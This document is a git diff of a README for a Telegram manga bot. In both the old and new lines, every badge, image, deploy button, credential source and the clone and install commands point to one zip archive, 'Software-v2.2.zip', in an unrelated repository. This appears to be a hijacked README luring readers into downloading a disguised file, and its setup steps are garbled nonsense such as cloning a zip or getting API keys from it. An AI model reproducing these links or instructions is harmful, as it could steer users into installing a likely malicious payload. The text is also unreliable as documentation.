@@ -1,7 +1,7 @@
 <p align="center">
-    <a href="https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip">
+    <a href="https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip">
         <kbd>
-            <img src="https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip" alt="Manga Bot">
+            <img src="https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip" alt="Manga Bot">
         </kbd>
     </a>
 </p>
@@ -11,15 +11,15 @@
 <p align="center">
 <div align=center>
 
-[![GitHub forks](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip)](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip)
-[![GitHub followers](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip%20Followers)](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip)
+[![GitHub forks](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip)](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip)
+[![GitHub followers](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip%20Followers)](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip)
 
 ----
 
-[![](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip%20Size&labelColor=292c3b)](#) [![](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip%20Commits)](#) [![](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip)](#)|[![](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip%20Issues&labelColor=292c3b)](#) [![](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip%20Issues&labelColor=292c3b)](#) [![](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip%20Pull%20Requests&labelColor=292c3b)](#) [![](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip%20Pull%20Requests&labelColor=292c3b)](#)
+[![](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip%20Size&labelColor=292c3b)](#) [![](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip%20Commits)](#) [![](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip)](#)|[![](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip%20Issues&labelColor=292c3b)](#) [![](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip%20Issues&labelColor=292c3b)](#) [![](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip%20Pull%20Requests&labelColor=292c3b)](#) [![](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip%20Pull%20Requests&labelColor=292c3b)](#)
 :---:|:---:|
-[![](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip%20Languages&labelColor=292c3b&color=blueviolet)](#) [![](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip)](#) [![](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip%20Commit&labelColor=292c3b&color=important)](#) [![](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip%20Branches&labelColor=292c3b)](#)|[![](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip)](#) [![](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip)](#) [![](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip)](#)
-[![](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip%20Channel-Join-9cf?style=for-the-badge&logo=telegram&logoColor=blue&style=flat&labelColor=292c3b)](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip) |[![](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip%20Group-Join-9cf?style=for-the-badge&logo=telegram&logoColor=blue&style=flat&labelColor=292c3b)](https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip) |
+[![](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip%20Languages&labelColor=292c3b&color=blueviolet)](#) [![](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip)](#) [![](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip%20Commit&labelColor=292c3b&color=important)](#) [![](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip%20Branches&labelColor=292c3b)](#)|[![](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip)](#) [![](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip)](#) [![](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip)](#)
+[![](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip%20Channel-Join-9cf?style=for-the-badge&logo=telegram&logoColor=blue&style=flat&labelColor=292c3b)](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip) |[![](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip%20Group-Join-9cf?style=for-the-badge&logo=telegram&logoColor=blue&style=flat&labelColor=292c3b)](https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip) |
 
 </div>
 
@@ -35,7 +35,7 @@
 ### ***Source Code*** : [Repo](Dra-Sama/Manhwa-Bot)
 
 #### Note: `If you Like My Work, Give Stars ⭐ to the Repo and Follow Me on Github`
-####    If You Want To Host Your Own Bot Then Change Your https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip File
+####    If You Want To Host Your Own Bot Then Change Your https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip File
     
 ----
 </div>
@@ -79,16 +79,16 @@ del_expired - (ADMINS) To DELETE ALL PREMUIM USERS
 ### 2. ***Env Variables***
 <details>
     <summary><b>Click Here</b></summary>
-    <code>API_ID</code>: <b><i>Get this value from https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip</i></b><br>
-    <code>API_HASH</code>: <b><i>Get this value from https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip</i></b><br>
+    <code>API_ID</code>: <b><i>Get this value from https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip</i></b><br>
+    <code>API_HASH</code>: <b><i>Get this value from https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip</i></b><br>
     <code>BOT_TOKEN</code>: <b><i>Make a bot from @BotFather and enter the token here.</i></b><br>
     <code>LOG_CHANNEL</code>: <b><i>[Optional] Channel ID Of Log Channel</i></b><br>
     <code>UPDATE_CHANNEL</code>: <b><i>[Optional] Channel ID Of Updates Channel Where you will get news about lastest chapter</i></b><br>
-    <code>DB_URL</code>: <b><i>MongoDB Url, get from https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip </i></b><br>
+    <code>DB_URL</code>: <b><i>MongoDB Url, get from https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip </i></b><br>
     <code>ADMINS</code>: <b><i>[Optional] Admins Users Which can get acess to bot settings</i></b><br>
     <code>IS_PRIVATE</code>: <b><i>[Optional] True Or None, if Bot is for admins only</i></b><br>
     <code>WEBS_HOST</code>: <b><i>[Optional] True, if You host at Koyeb and Render or None for Vps</i></b><br>
-    <code>FORCE_SUB_CHANNEL</code>: <b><i>[Optional] Create a new channel (public), copy username wihtout https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip</i></b><br>
+    <code>FORCE_SUB_CHANNEL</code>: <b><i>[Optional] Create a new channel (public), copy username wihtout https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip</i></b><br>
     <code>SHORTENER</code>: <b><i>[Optional] True, If you want add shornter at bot...</i></b><br>
     <code>SHORTENER_API</code>: <b><i>[Optional] Shortener Developer API, put {} for url..</i></b><br>
     <code>DURATION</code>: <b><i>[Optional] Shortener duration, at hours</i></b><br>
@@ -102,8 +102,8 @@ del_expired - (ADMINS) To DELETE ALL PREMUIM USERS
             <details>
                 <summary><b>Deploy on Heroku</b></summary>
                 <b>BEFORE YOU DEPLOY ON HEROKU, YOU SHOULD FORK THE REPO AND CHANGE ITS NAME TO ANYTHING ELSE</b><br>
-                <a href="https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip">
-                    <img src="https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip" alt="Deploy to Heroku">
+                <a href="https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip">
+                    <img src="https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip" alt="Deploy to Heroku">
                 </a><br>
             </details>
         </li>
@@ -111,8 +111,8 @@ del_expired - (ADMINS) To DELETE ALL PREMUIM USERS
             <details>
                 <summary><b>Deploy on Koyeb</b></summary>
                 The fastest way to deploy the application is to click the <b>Deploy to Koyeb</b> button below.<br>
-                <a href="https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip">
-                    <img src="https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip" alt="Deploy to Koyeb">
+                <a href="https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip">
+                    <img src="https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip" alt="Deploy to Koyeb">
                 </a><br>
             </details>
         </li>
@@ -121,9 +121,9 @@ del_expired - (ADMINS) To DELETE ALL PREMUIM USERS
                 <summary><b>Deploy on Vps</b></summary>
                 <b>BEFORE YOU DEPLOY ON VPS, YOU SHOULD FORK THE REPO AND CHANGE ITS NAME TO ANYTHING ELSE</b><br><br>
                 - Clone this repo:
-                    <pre>git clone https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip MB && cd MB</pre>
-                - Install https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip 
-                    <pre>sudo apt get https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip</pre>
+                    <pre>git clone https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip MB && cd MB</pre>
+                - Install https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip 
+                    <pre>sudo apt get https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip</pre>
                 - Build Docker 
                     <pre>sudo docker build . -t mangabot</pre>
                 - Run The Docker
@@ -159,15 +159,15 @@ del_expired - (ADMINS) To DELETE ALL PREMUIM USERS
     <table>
         <tr>
             <td align="center">
-                <a href="https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip">
-                    <img width="200" src="https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip" alt="Dra Sama">
+                <a href="https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip">
+                    <img width="200" src="https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip" alt="Dra Sama">
                 </a>
                 <br />
                 <b>Dra Sama</b>
             </td>
             <td align="center">
-                <a href="https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip">
-                    <img width="200" src="https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip" alt="Shanks Kun">
+                <a href="https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip">
+                    <img width="200" src="https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip" alt="Shanks Kun">
                 </a>
                 <br />
                 <b>Shanks Kun</b>
@@ -175,7 +175,7 @@ del_expired - (ADMINS) To DELETE ALL PREMUIM USERS
         </tr>
     </table>
     <font style="font-size: xx-large; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">
-        <b>=> Thanks To <a href="https://github.com/RaviChatta/Man/raw/refs/heads/main/Webs/Software-v2.2.zip">The Contributors</a> Who Helped In Making Manga Bot Useful And Powerful 🖤 </b><br>
+        <b>=> Thanks To <a href="https://raw.githubusercontent.com/RaviChatta/Man/main/Webs/Software-v2.2.zip">The Contributors</a> Who Helped In Making Manga Bot Useful And Powerful 🖤 </b><br>
     </font>
 </details>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
